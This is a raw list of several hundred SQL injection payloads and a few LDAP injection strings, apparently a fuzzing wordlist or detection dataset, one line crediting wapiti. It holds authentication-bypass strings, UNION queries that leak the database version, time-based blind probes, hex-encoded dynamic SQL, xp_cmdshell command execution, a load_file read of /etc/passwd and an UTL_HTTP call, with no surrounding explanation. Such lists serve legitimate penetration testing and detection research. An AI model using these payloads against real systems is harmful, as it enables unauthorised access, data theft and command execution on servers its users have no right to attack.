" select * from users where id = '1' or \<$ union select 1,@@VERSION -- 1'"
" select * from users where id = '1' or \<  = 1 union select 1,@@VERSION -- 1'"
 select * from users where id = '1' or !<@ or 1 = 1 -- 1'
" select * from users where id = '1' or !<@ union select 1,version (  )  -- 1'"
" select * from users where id = '1' or @ ( 1 )  = 1 union select 1,version (  )  -- 1'"
" select * from users where id = '1' or @ 1 = 1 union select 1,version (  )  -- 1'"
" select * from users where id = '1' or @ @1 = 1 union select 1,version (  )  -- 1'"
" select * from users where id = 1 or "" (  ) "" or 1 = 1 -- 1"
" select * from users where id = 1 or "" ( ,"" = 1 or 1 = 1 -- 1"
" select * from users where id = 1 or "" ( ."" or 1 = 1 -- 1"
" select * from users where id = 1 or "" ( 1"" or 1 = 1 -- 1"
" select * from users where id = 1 or "" ( ;"" or 1 = 1 -- 1"
" select * from users where id = 1 or "" ( ]"" or 1 = 1 -- 1"
" select * from users where id = 1 or 1#"" (  union select 1,version (  )  -- 1"
" select * from users where id = 1 or 1#"" (  union select version (  ) ,version (  )  -- 1"
" select * from users where id = 1 or 1#"" (  union select 'a',version (  )  -- 1"
" select * from users where id = 1 or 1#"" (  union select null,version (  )  -- 1"
" select * from users where id = 1 or "" ( #"" or 1 = 1 -- 1"
" select * from users where id = 1 or "" ( ["" or 1 = 1 -- 1"
" select * from users where id = 1 or "" ( _"" or 1 = 1 -- 1"
" select * from users where id = 1 or @#"" (  = 1 or 1 = 1 -- 1"
" select * from users where id = 1 or @#"" (  = 1 union select 1,version (  )  -- 1"
" select * from users where id = 1 or "" ( &"" or 1 = 1 -- 1"
" select * from users where id = 1 or "" ( @"" or 1 = 1 -- 1"
" select * from users where id = 1 or "" ( {"" or 1 = 1 -- 1"
" select * from users where id = 1 or "" )  ( "" = 1 or 1 = 1 -- 1"
" select * from users where id = 1 or "" ) ,"" or 1 = 1 -- 1"
" select * from users where id = 1 or "" ) ."" = 1 or 1 = 1 -- 1"
" select * from users where id = 1 or "" ) 1"" or 1 = 1 -- 1"
" select * from users where id = 1 or "" ) ;"" or 1 = 1 -- 1"
" select * from users where id = 1 or "" ) ]"" or 1 = 1 -- 1"
" select * from users where id = 1 or "" ) ["" or 1 = 1 -- 1"
" select * from users where id = 1 or "" ) $"" or 1 = 1 -- 1"
" select * from users where id = 1 or "" ) @"" or 1 = 1 -- 1"
" select * from users where id = 1 or "" ) {"" or 1 = 1 -- 1"
" select * from users where id = 1 or "", ( "" or 1 = 1 -- 1"
" select * from users where id = 1 or "", ) "" = 1 or 1 = 1 -- 1"
" select * from users where id = 1 or "",,"" = 1 or 1 = 1 -- 1"
" select * from users where id = 1 or "",."" or 1 = 1 -- 1"
" select * from users where id = 1 or "",;"" or 1 = 1 -- 1"
" select * from users where id = 1 or "",?"" or 1 = 1 -- 1"
" select * from users where id = 1 or 1#"", union select 1,version (  )  -- 1"
" select * from users where id = 1 or 1#"", union select version (  ) ,version (  )  -- 1"
" select * from users where id = 1 or 1#"", union select 'a',version (  )  -- 1"
" select * from users where id = 1 or 1#"", union select null,version (  )  -- 1"
" select * from users where id = 1 or "",#"" or 1 = 1 -- 1"
" select * from users where id = 1 or 1#"", = 1 or 1 = 1 -- 1"
" select * from users where id = 1 or @#"", = 1 union select 1,version (  )  -- 1"
" select * from users where id = 1 or "",&"" or 1 = 1 -- 1"
" select * from users where id = 1 or "",{"" or 1 = 1 -- 1"
" select * from users where id = 1 or "". ( "" or 1 = 1 -- 1"
" select * from users where id = 1 or "". ) "" or 1 = 1 -- 1"
" select * from users where id = 1 or "".,"" or 1 = 1 -- 1"
" select * from users where id = 1 or "".."" = 1 or 1 = 1 -- 1"
" select * from users where id = 1 or "".;"" or 1 = 1 -- 1"
" select * from users where id = 1 or "".]"" or 1 = 1 -- 1"
" select * from users where id = 1 or 1#"". union select 1,version (  )  -- 1"
" select * from users where id = 1 or 1#"". union select version (  ) ,version (  )  -- 1"
" select * from users where id = 1 or 1#"". union select 'a',version (  )  -- 1"
" select * from users where id = 1 or 1#"". union select null,version (  )  -- 1"
" select * from users where id = 1 or "".#"" or 1 = 1 -- 1"
" select * from users where id = 1 or "".["" or 1 = 1 -- 1"
" select * from users where id = 1 or ""._"" or 1 = 1 -- 1"
" select * from users where id = 1 or @#"". = 1 or 1 = 1 -- 1"
" select * from users where id = 1 or 1#"". = 1 union select 1,version (  )  -- 1"
" select * from users where id = 1 or "".%"" or 1 = 1 -- 1"
" select * from users where id = 1 or "".@"" or 1 = 1 -- 1"
" select * from users where id = 1 or "".{"" or 1 = 1 -- 1"
" select * from users where id = 1 or ""1 ( "" = 1 or 1 = 1 -- 1"
" select * from users where id = 1 or ""1 ) "" or 1 = 1 -- 1"
" select * from users where id = 1 or ""1,"" or 1 = 1 -- 1"
" select * from users where id = 1 or ""1;"" = 1 or 1 = 1 -- 1"
" select * from users where id = 1 or ""1]"" or 1 = 1 -- 1"
" select * from users where id = 1 or 1#""1 union select 1,version (  )  -- 1"
" select * from users where id = 1 or 1#""1 union select version (  ) ,version (  )  -- 1"
" select * from users where id = 1 or 1#""1 union select 'a',version (  )  -- 1"
" select * from users where id = 1 or 1#""1 union select null,version (  )  -- 1"
" select * from users where id = 1 or ""1#"" or 1 = 1 -- 1"
" select * from users where id = 1 or ""1["" or 1 = 1 -- 1"
" select * from users where id = 1 or ""1_"" or 1 = 1 -- 1"
" select * from users where id = 1 or ""1&"" or 1 = 1 -- 1"
" select * from users where id = 1 or ""1{"" or 1 = 1 -- 1"
" select * from users where id = '1' or """"<@ union select 1,version (  )  -- 1'"
" select * from users where id = 1 or 1#""; or 1 = 1 -- 1"
" select * from users where id = 1 or ""; ( "" or 1 = 1 -- 1"
" select * from users where id = 1 or ""; ) "" = 1 or 1 = 1 -- 1"
" select * from users where id = 1 or "";,"" = 1 or 1 = 1 -- 1"
" select * from users where id = 1 or "";."" = 1 or 1 = 1 -- 1"
" select * from users where id = 1 or "";1"" or 1 = 1 -- 1"
" select * from users where id = 1 or "";]"" or 1 = 1 -- 1"
" select * from users where id = 1 or 1#""; union select 1,version (  )  -- 1"
" select * from users where id = 1 or 1#""; union select version (  ) ,version (  )  -- 1"
" select * from users where id = 1 or 1#""; union select 'a',version (  )  -- 1"
" select * from users where id = 1 or 1#""; union select null,version (  )  -- 1"
" select * from users where id = 1 or "";#"" or 1 = 1 -- 1"
" select * from users where id = 1 or "";["" or 1 = 1 -- 1"
" select * from users where id = 1 or "";_"" or 1 = 1 -- 1"
" select * from users where id = 1 or @#""; = 1 or 1 = 1 -- 1"
" select * from users where id = 1 or 1#""; = 1 union select 1,version (  )  -- 1"
" select * from users where id = 1 or "";&"" or 1 = 1 -- 1"
" select * from users where id = '1' union select "";""_,version (  )  -- 1'"
" select * from users where id = 1 or "";@"" or 1 = 1 -- 1"
" select * from users where id = 1 or "";{"" or 1 = 1 -- 1"
" select * from users where id = 1 or 1#""? or 1 = 1 -- 1"
" select * from users where id = 1 or ""? ( "" or 1 = 1 -- 1"
" select * from users where id = 1 or ""] ) "" or 1 = 1 -- 1"
" select * from users where id = 1 or ""?,"" or 1 = 1 -- 1"
" select * from users where id = '1' union select $[""],@@VERSION -- 1'"
" select * from users where id = 1 or ""]."" or 1 = 1 -- 1"
" select * from users where id = 1 or ""]1"" or 1 = 1 -- 1"
" select * from users where id = 1 or ""?;"" or 1 = 1 -- 1"
" select * from users where id = 1 or ""??"" or 1 = 1 -- 1"
" select * from users where id = 1 or 1#""? union select 1,version (  )  -- 1"
" select * from users where id = 1 or 1#""? union select version (  ) ,version (  )  -- 1"
" select * from users where id = 1 or 1#""? union select 'a',version (  )  -- 1"
" select * from users where id = 1 or 1#""? union select null,version (  )  -- 1"
" select * from users where id = 1 or ""?#"" or 1 = 1 -- 1"
" select * from users where id = 1 or ""?["" or 1 = 1 -- 1"
" select * from users where id = 1 or ""?_"" or 1 = 1 -- 1"
" select * from users where id = 1 or 1#""? = 1 or 1 = 1 -- 1"
" select * from users where id = 1 or 1#""? = 1 union select 1,version (  )  -- 1"
" select * from users where id = 1 or ""?%"" or 1 = 1 -- 1"
" select * from users where id = '1' union select ""?""_,version (  )  -- 1'"
" select * from users where id = 1 or ""?@"" or 1 = 1 -- 1"
" select * from users where id = 1 or ""]{"" or 1 = 1 -- 1"
" select * from users where id = '1' union select ||/1,version (  )  -- 1'"
" select * from users where id = '1' union select  ( \ ) ,@@VERSION -- 1'"
" select * from users where id = '1' union select  ( \. ) ,@@VERSION -- 1'"
" select * from users where id = '1' union select  ( 1 ) ,banner from v$version where rownum = 1 -- 1'"
" select * from users where id = '1' union select \,@@VERSION -- 1'"
" select * from users where id = '1' union select \.,@@VERSION -- 1'"
" select * from users where id = '1' union select \.#,@@VERSION -- 1'"
" select * from users where id = '1' union select \.%1,@@VERSION -- 1'"
" select * from users where id = '1' union select 1,banner from v$version where rownum = 1 -- 1'"
" select * from users where id = '1' union select 1a,banner from v$version where rownum = 1 -- 1'"
" select * from users where id = '1' union select 1""!"",banner from v$version where rownum = 1 -- 1'"
" select * from users where id = '1' union select \#,@@VERSION -- 1'"
" select * from users where id = '1' union select $ .,@@VERSION -- 1'"
" select * from users where id = '1' union select $ _,@@VERSION -- 1'"
" select * from users where id = '1' union select $*$,@@VERSION -- 1'"
" select * from users where id = '1' union select +\,@@VERSION -- 1'"
" select * from users where id = '1' union select +\.,@@VERSION -- 1'"
" select * from users where id = '1' union select !<1,version (  )  -- 1'"
" select * from users where id = '1' union select +\#,@@VERSION -- 1'"
" select * from users where id = '1' union select !<@,version (  )  -- 1'"
" select * from users where id = '1' union select @ 1,version (  )  --  1'"
" select * from users where id = '1'   union select null,banner from v$version where rownum = 1 -- 1'"
" select * from users where id = '1' union select @ @1,version (  )  --  1'"
" select * from users where id = 1 or ""\#"" or 1 = 1 -- 1"
" select * from users where id = 1 or ""$ ( "" or 1 = 1 -- 1"
" select * from users where id = 1 or ""_ ) "" or 1 = 1 -- 1"
" select * from users where id = '1' union select ""[""_,version (  )  -- 1'"
" select * from users where id = 1 or ""_;"" or 1 = 1 -- 1"
" select * from users where id = 1 or ""$?"" or 1 = 1 -- 1"
" select * from users where id = 1 or 1#""$ union select 1,version (  )  -- 1"
" select * from users where id = 1 or 1#""$ union select version (  ) ,version (  )  -- 1"
" select * from users where id = 1 or 1#""$ union select 'a',version (  )  -- 1"
" select * from users where id = 1 or 1#""$ union select null,version (  )  -- 1"
" select * from users where id = 1 or ""$#"" or 1 = 1 -- 1"
" select * from users where id = 1 or ""$["" or 1 = 1 -- 1"
" select * from users where id = 1 or ""$_"" or 1 = 1 -- 1"
" select * from users where id = 1 or ""$&"" or 1 = 1 -- 1"
" select * from users where id = 1 or ""$@"" or 1 = 1 -- 1"
" select * from users where id = 1 or ""_{"" or 1 = 1 -- 1"
 select * from users where id = '1' * ( \ )  or 1 = 1 -- 1'
" select * from users where id = '1' +  ( \ )  union select 1,@@VERSION -- 1'"
" select * from users where id = '1' +  ( \. )  union select 1,@@VERSION -- 1'"
" select * from users where id = '1' * ( 1 )  union select 1,banner from v$version where rownum = 1 -- 1'"
" select * from users where id = 1 or ""& ( "" or 1 = 1 -- 1"
" select * from users where id = 1 or ""& ) "" or 1 = 1 -- 1"
" select * from users where id = 1 or ""%,"" or 1 = 1 -- 1"
 select * from users where id = '1'<@.. or 1 = 1 -- 1'
" select * from users where id = '1'<@.. union select 1,version (  )  -- 1'"
 select * from users where id = '1' <@.$ or 1 = 1 -- 1'
" select * from users where id = '1' <@._ union select 1,version (  )  -- 1'"
" select * from users where id = 1 or ""%."" or 1 = 1 -- 1"
" select * from users where id = '1' + 1||1 union select 1,banner from v$version where rownum = 1 -- 1'"
" select * from users where id = '1' *1 union select 1,banner from v$version where rownum = 1 -- 1'"
" select * from users where id = 1 or ""%1"" or 1 = 1 -- 1"
" select * from users where id = 1 or ""%;"" or 1 = 1 -- 1"
" select * from users where id = 1 or ""%?"" or 1 = 1 -- 1"
" select * from users where id = '1' + @<@# union select 1,version (  )  -- 1'"
 select * from users where id = '1' *$ . or 1 = 1 -- 1'
" select * from users where id = '1' + $ . union select 1,@@VERSION -- 1'"
 select * from users where id = '1' *$ 1 or 1 = 1 -- 1'
" select * from users where id = 1 or ""%["" or 1 = 1 -- 1"
 select * from users where id = '1' <@$_ or 1 = 1 -- 1'
" select * from users where id = '1' <@$_ union select 1,version (  )  -- 1'"
" select * from users where id = 1 or ""%_"" or 1 = 1 -- 1"
 select * from users where id = '1' + $+%\ or 1 = 1 -- 1'
 select * from users where id = '1' <@&1 or 1 = 1 -- 1'
" select * from users where id = '1' <@&1 union select 1,version (  )  -- 1'"
" select * from users where id = '1' <@<@ union select 1,version (  )  -- 1'"
 select * from users where id = '1' + $+%$ or 1 = 1 -- 1'
" select * from users where id = '1' + $+*$ union select 1,@@VERSION -- 1'"
" select * from users where id = 1 or ""%&"" or 1 = 1 -- 1"
 select * from users where id = '1' <@&@ or 1 = 1 -- 1'
" select * from users where id = '1' %!<@ union select 1,version (  )  -- 1'"
" select * from users where id = '1'<@$$ union select 1,version (  )  -- 1'"
" select * from users where id = '1' + @ ( 1 )  union select 1,version (  )  -- 1'"
" select * from users where id = '1' + @ 1 union select 1,version (  )  -- 1'"
" select * from users where id = '1' + @ 1! union select 1,version (  )  -- 1'"
" select * from users where id = '1' + @ @1 union select 1,version (  )  -- 1'"
" select * from users where id = 1 or ""%{"" or 1 = 1 -- 1"
" select * from users where id = 1 or ""@ ( "" or 1 = 1 -- 1"
" select * from users where id = 1 or ""@ ) "" or 1 = 1 -- 1"
" select * from users where id = 1 or ""@;"" = 1 or 1 = 1 -- 1"
" select * from users where id = 1 or ""@?"" or 1 = 1 -- 1"
" select * from users where id = 1 or 1#""@ union select 1,version (  )  -- 1"
" select * from users where id = 1 or 1#""@ union select version (  ) ,version (  )  -- 1"
" select * from users where id = 1 or 1#""@ union select 'a',version (  )  -- 1"
" select * from users where id = 1 or 1#""@ union select null,version (  )  -- 1"
" select * from users where id = 1 or ""@#"" or 1 = 1 -- 1"
" select * from users where id = 1 or ""@%"" or 1 = 1 -- 1"
" select * from users where id = 1 or ""{ ( "" = 1 or 1 = 1 -- 1"
" select * from users where id = 1 or ""{ ) "" or 1 = 1 -- 1"
" select * from users where id = 1 or ""{,"" = 1 or 1 = 1 -- 1"
" select * from users where id = 1 or ""{."" or 1 = 1 -- 1"
" select * from users where id = 1 or ""{1"" = 1 or 1 = 1 -- 1"
" select * from users where id = 1 or ""{;"" or 1 = 1 -- 1"
" select * from users where id = 1 or ""{?"" or 1 = 1 -- 1"
" select * from users where id = 1 or 1#""{ union select 1,version (  )  -- 1"
" select * from users where id = 1 or 1#""{ union select version (  ) ,version (  )  -- 1"
" select * from users where id = 1 or 1#""{ union select 'a',version (  )  -- 1"
" select * from users where id = 1 or 1#""{ union select null,version (  )  -- 1"
" select * from users where id = 1 or ""{#"" or 1 = 1 -- 1"
" select * from users where id = 1 or @#""{ = 1 or 1 = 1 -- 1"
" select * from users where id = 1 or @#""{ = 1 union select 1,version (  )  -- 1"
" select * from users where id = 1 or ""{%"" or 1 = 1 -- 1"
" select * from users where id = 1 or ""{@"" or 1 = 1 -- 1"
" select * from users where id = 1 or ""{{"" or 1 = 1 -- 1"
" select * from users where id = 1 + @`\` union select 1,version (  )  -- 1"
" select * from users where id = 1 + @<1# union select 1,version (  )  -- 1"
" select * from users where id = 1 + @<@. union select 1,version (  )  -- 1"
" select * from users where id = 1 -@<@ union select 1,version (  )  -- 1"
" select * from users where id = 1 -@<@ union select version (  ) ,version (  )  -- 1"
" select * from users where id = 1 -@<@ union select null,version (  )  -- 1"
" select * from users where id = 1 + @<@# union select null,version (  )  -- 1"
' or ''-'
' or '' '
' or ''&'
' or ''^'
' or ''*'
""" or """"-"""
""" or """" """
""" or """"&"""
""" or """"^"""
""" or """"*"""
or true--
""" or true--"
' or true--
""" )  or true--"
' )  or true--
' or 'x' = 'x
' )  or  ( 'x' )  =  ( 'x
'  )  )   or   (  (  'x'  )  )   =   (  (  'x
""" or ""x"" = ""x"
""" )  or  ( ""x"" )  =  ( ""x"
"""  )  )   or   (  (  ""x""  )  )   =   (  (  ""x"
or 1 = 1
or 1 = 1-- 
or 1 = 1#
or 1 = 1/*
admin' --
admin' #
admin'/*
admin' or '1' = '1
admin' or '1' = '1'--
admin' or '1' = '1'#
admin' or '1' = '1'/*
admin'or 1 = 1 or '' = '
admin' or 1 = 1
admin' or 1 = 1--
admin' or 1 = 1#
admin' or 1 = 1/*
admin' )  or  ( '1' = '1
admin' )  or  ( '1' = '1'--
admin' )  or  ( '1' = '1'#
admin' )  or  ( '1' = '1'/*
admin' )  or '1' = '1
admin' )  or '1' = '1'--
admin' )  or '1' = '1'#
admin' )  or '1' = '1'/*
"1234 ' AND 1 = 0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055"
"admin"" --"
"admin"" #"
"admin""/*"
"admin"" or ""1"" = ""1"
"admin"" or ""1"" = ""1""--"
"admin"" or ""1"" = ""1""#"
"admin"" or ""1"" = ""1""/*"
"admin""or 1 = 1 or """" = """
"admin"" or 1 = 1"
"admin"" or 1 = 1--"
"admin"" or 1 = 1#"
"admin"" or 1 = 1/*"
"admin"" )  or  ( ""1"" = ""1"
"admin"" )  or  ( ""1"" = ""1""--"
"admin"" )  or  ( ""1"" = ""1""#"
"admin"" )  or  ( ""1"" = ""1""/*"
"admin"" )  or ""1"" = ""1"
"admin"" )  or ""1"" = ""1""--"
"admin"" )  or ""1"" = ""1""#"
"admin"" )  or ""1"" = ""1""/*"
"1234 "" AND 1 = 0 UNION ALL SELECT ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055"
'sqlvuln
'+sqlvuln
sqlvuln;
 ( sqlvuln ) 
a' or 1 = 1--
"""a"""" or 1 = 1--"""
 or a  =  a
a' or 'a'  =  'a
1 or 1 = 1
a' waitfor delay '0:0:10'--
1 waitfor delay '0:0:10'--
declare @q nvarchar  ( 4000 )  select @q  = 
0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A
031003000270000
declare @s varchar ( 22 )  select @s  = 
0x77616974666F722064656C61792027303A303A31302700 exec ( @s ) 
0x730065006c00650063007400200040004000760065007200730069006f006e00 exec ( @q ) 
declare @s varchar  ( 8000 )  select @s  =  0x73656c65637420404076657273696f6e
exec ( @s ) 
' or 1 = 1
‘ or 1 = 1 --
x' AND userid IS NULL; --
x' AND email IS NULL; --
anything' OR 'x' = 'x
x' AND 1 =  ( SELECT COUNT ( * )  FROM tabname ) ; --
x' AND members.email IS NULL; --
x' OR full_name LIKE '%Bob%
23 OR 1 = 1
'; exec master..xp_cmdshell 'ping 172.10.1.255'--
' or '' = '
' or 'x' = 'x
 or x = x
' )  or  ( 'x' = 'x
0 or 1 = 1
' or 0 = 0 --
""" or 0 = 0 --"
or 0 = 0 --
' or 0 = 0 #
" or 0 = 0 #"""
or 0 = 0 #
' or 1 = 1--
""" or 1 = 1--"
' or '1' = '1'--
' or 1 --'
or 1 = 1--
or 1 = 1
or 1 = 1 --
' or 1 = 1 or '' = '
" or 1 = 1 or """" = "
' or a = a--
 or a = a
' )  or  ( 'a' = 'a
 )  or  ( a = a
hi or a = a
"hi or 1 = 1 --"""
hi' or 1 = 1 --
hi' or 'a' = 'a
hi' )  or  ( 'a' = 'a
"""hi"""" )  or  ( """"a"""" = """"a"""
'hi' or 'x' = 'x';
@variable
",@variable"
PRINT @@variable
select
insert
procedure
order by
delete
update
distinct
having
truncate
replace
handler
bfilename
' or username like '%
' or uname like '%
' or userid like '%
' or uid like '%
' or user like '%
exec xp
exec sp
'; exec master..xp_cmdshell
'; exec xp_regread
t'exec master..xp_cmdshell 'nslookup www.google.com'--
--sp_password
\x27UNION SELECT
' UNION SELECT
' UNION ALL SELECT
' or  ( EXISTS ) 
'  ( select top 1
'||UTL_HTTP.REQUEST
1;SELECT *
to_timestamp_tz
tz_offset
"<>""'%; )  ( &+"
' or 1 = 1
%27 or 1 = 1
 $ ( sleep 50 ) 
 'sleep 50'
char%4039%41%2b%40SELECT
&apos; OR
'sqlattempt1
 ( sqlattempt2 ) 
%2A%7C
* ( | ( mail = *  )  )  
%2A%28%7C%28mail%3D%2A%29%29
* ( | ( objectclass = *  )  )  
%2A%28%7C%28objectclass%3D%2A%29%29
' or 1 = 1 or '' = '
' or '' = '
x' or 1 = 1 or 'x' = 'y
a' or 3 = 3--
"""a"""" or 3 = 3--"""
' or 3 = 3
‘ or 3 = 3 --
 )  or  ( 'x' = 'x
 or 1 = 1
; execute immediate 'sel' || 'ect us' || 'er'
"benchmark ( 10000000,MD5 ( 1  )  )  #"
update
""";waitfor delay '0:0:__TIME__'--"
1 )  or pg_sleep ( __TIME__ ) --
"|| ( elt ( -3+5,bin ( 15 ) ,ord ( 10 ) ,hex ( char ( 45  )  )    )  )  "
"""hi"""" )  or  ( """"a"""" = """"a"""
delete
""" or sleep ( __TIME__ ) #"
pg_sleep ( __TIME__ ) --
* ( | ( objectclass = *  )  )  
declare @q nvarchar  ( 200 )  0x730065006c00650063 ...
 or 0 = 0 #
insert
1 )  or sleep ( __TIME__ ) #
 )  or  ( 'a' = 'a
; exec xp_regread
@var select @var as var into temp end --
"1  )  )   or benchmark ( 10000000,MD5 ( 1  )  )  #"
 ( ||6 ) 
"""a"""" or 3 = 3--"""
""" or benchmark ( 10000000,MD5 ( 1  )  )  #"
# from wapiti
 or 0 = 0 --
1 waitfor delay '0:0:10'--
 or 'a' = 'a
"hi or 1 = 1 --"""
or a  =  a
 UNION ALL SELECT
 )  or sleep ( __TIME__ )  = '
"  )  )   or benchmark ( 10000000,MD5 ( 1  )  )  #"
hi' or 'a' = 'a
 or 1 = 1
 or 2 > 1
"""  )  )   or benchmark ( 10000000,MD5 ( 1  )  )  #"
hi' )  or  ( 'a' = 'a
 or 3 = 3
  )  )  ;waitfor delay '0:0:__TIME__'--
a' waitfor delay '0:0:10'--
"1; ( load_file ( char ( 47,101,116,99,47,112,97,115, ..."
or 1 = 1
1 or sleep ( __TIME__ ) #
or 1 = 1
 and 1 in  ( select var from temp ) --
 or '7659' = '7659
 or 'text'  =  n'text'
 or 1 = 1 or '' = '
declare @s varchar  ( 200 )  select @s  =  0x73656c6 ...
exec xp
; exec master..xp_cmdshell 'ping 172.10.1.255'--
3.10E+17
""" or pg_sleep ( __TIME__ ) --"
x' AND email IS NULL; --
admin' or '
 or 'unusual'  =  'unusual'
truncate
"1 )  or benchmark ( 10000000,MD5 ( 1  )  )  #"
\x27UNION SELECT
declare @s varchar ( 200 )  select @s  =  0x77616974 ...
tz_offset
sqlvuln
"""  )  )  ;waitfor delay '0:0:__TIME__'--"
or 1 = 1 --
%2A%28%7C%28objectclass%3D%2A%29%29
or a = a
 )  union select * from information_schema.tables;
PRINT @@variable
or isNULL ( 1/0 )  /*
""" or ""a"" = ""a"
 ( sqlvuln ) 
x' AND members.email IS NULL; --
 or 1 = 1--
" and 1 =  (  if  (  (  load_file ( char ( 110,46,101,120,11 ..."
0x770061006900740066006F0072002000640065006C00 ...
 'sleep 50'
1  )  )   or pg_sleep ( __TIME__ ) --
/**/or/**/1/**/ = /**/1
 union all select @@version--
",@variable"
 ( sqlattempt2 ) 
 or  ( EXISTS ) 
t'exec master..xp_cmdshell 'nslookup www.googl ...
 $ ( sleep 50 ) 
"1 or benchmark ( 10000000,MD5 ( 1  )  )  #"
 or '' = '
||UTL_HTTP.REQUEST
 or pg_sleep ( __TIME__ ) --
hi' or 'x' = 'x';
""" )  or sleep ( __TIME__ )  = """
 or 'whatever' in  ( 'whatever' ) 
; begin declare @var varchar ( 8000 )  set @var = ' ...
" union select 1,load_file ( '/etc/passwd' ) ,1,1,1;"
0x77616974666F722064656C61792027303A303A313027 ...
exec ( @s ) 
 )  or pg_sleep ( __TIME__ ) --
 union select
 or sleep ( __TIME__ ) #
 select * from information_schema.tables--
a' or 1 = 1--
a' or 'a'  =  'a
declare @s varchar ( 22 )  select @s  = 
 or 2 between 1 and 3
 or a = a--
 or '1' = '1
 or sleep ( __TIME__ )  = '
 or 1 --'
"or 0 = 0 #"""
having
""" or isNULL ( 1/0 )  /*"
declare @s varchar  ( 8000 )  select @s  =  0x73656c ...
â or 1 = 1 --
char%4039%41%2b%40SELECT
order by
bfilename
 having 1 = 1--
" )  or benchmark ( 10000000,MD5 ( 1  )  )  #"
 or username like char ( 37 ) ;
;waitfor delay '0:0:__TIME__'--
""" or 1 = 1--"
x' AND userid IS NULL; --
 or 'text' > 't'
  ( select top 1
" or benchmark ( 10000000,MD5 ( 1  )  )  #"
""" ) ;waitfor delay '0:0:__TIME__'--"
a' or 3 = 3--
 -- &password = 
 group by userid having 1 = 1--
 or '' = '
; exec master..xp_cmdshell
 or x = x
select
"""  )  )   or sleep ( __TIME__ )  = """
0x730065006c0065006300740020004000400076006500 ...
hi' or 1 = 1 --
""" )  or pg_sleep ( __TIME__ ) --"
 or 'x' = 'x
 or 'something'  =  'some'+'thing'
exec sp
Ã½ or 1 = 1 --
1 or pg_sleep ( __TIME__ ) --
0 or 1 = 1
 )  or  ( a = a
uni/**/on sel/**/ect
replace
%27 or 1 = 1
  )  )   or pg_sleep ( __TIME__ ) --
x' AND 1 =  ( SELECT COUNT ( * )  FROM tabname ) ; --
&apos; OR
; or '1' = '1'
declare @q nvarchar  ( 200 )  select @q  =  0x770061 ...
1 or 1 = 1
; exec  ( 'sel' + 'ect us' + 'er' ) 
23 OR 1 = 1
anything' OR 'x' = 'x
declare @q nvarchar  ( 4000 )  select @q  = 
or 0 = 0 --
1  )  )   or sleep ( __TIME__ ) #
or 0 = 0 #
 select name from syscolumns where id  =   ( sele ...
hi or a = a
* ( | ( mail = *  )  )  
password:*/ = 1--
distinct
 ) ;waitfor delay '0:0:__TIME__'--
to_timestamp_tz
""" )  or benchmark ( 10000000,MD5 ( 1  )  )  #"
 UNION SELECT
%2A%28%7C%28mail%3D%2A%29%29
+sqlvuln
 or 1 = 1 /*
  )  )   or sleep ( __TIME__ )  = '
"or 1 = 1 or """" = "
 or 1 in  ( select @@version ) --
sqlvuln;
 union select * from users where login  =  char ...
x' or 1 = 1 or 'x' = 'y
â or 3 = 3 --
@variable
 or '1' = '1'--
"""a"""" or 1 = 1--"""
%2A%7C
""" or 0 = 0 --"
"""  )  )   or pg_sleep ( __TIME__ ) --"
 or 1/*
 or a  =  a
declare @q nvarchar  ( 200 )  select @q  =  0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec ( @q ) 
declare @s varchar ( 200 )  select @s  =  0x77616974666F722064656C61792027303A303A31302700 exec ( @s )  
declare @q nvarchar  ( 200 )  0x730065006c00650063007400200040004000760065007200730069006f006e00 exec ( @q ) 
declare @s varchar  ( 200 )  select @s  =  0x73656c65637420404076657273696f6e exec ( @s ) 
' or 1 = 1
 or 1 = 1 --
x' OR full_name LIKE '%Bob%
'; exec master..xp_cmdshell 'ping 172.10.1.255'--
' or '' = '
' or 'x' = 'x
' )  or  ( 'x' = 'x
' or 0 = 0 --
' or 0 = 0 #
" or 0 = 0 #"""
' or 1 = 1--
' or '1' = '1'--
' or 1 --'
or 1 = 1--
' or 1 = 1 or '' = '
" or 1 = 1 or """" = "
' or a = a--
 or a = a
' )  or  ( 'a' = 'a
'hi' or 'x' = 'x';
procedure
handler
' or username like '%
' or uname like '%
' or userid like '%
' or uid like '%
' or user like '%
'; exec master..xp_cmdshell
'; exec xp_regread
t'exec master..xp_cmdshell 'nslookup www.google.com'--
--sp_password
' UNION SELECT
' UNION ALL SELECT
' or  ( EXISTS ) 
'  ( select top 1
'||UTL_HTTP.REQUEST
1;SELECT *
"<>""'%; )  ( &+"
' or 1 = 1
'sqlattempt1
' or '' = '
' or 3 = 3
 or 3 = 3 --
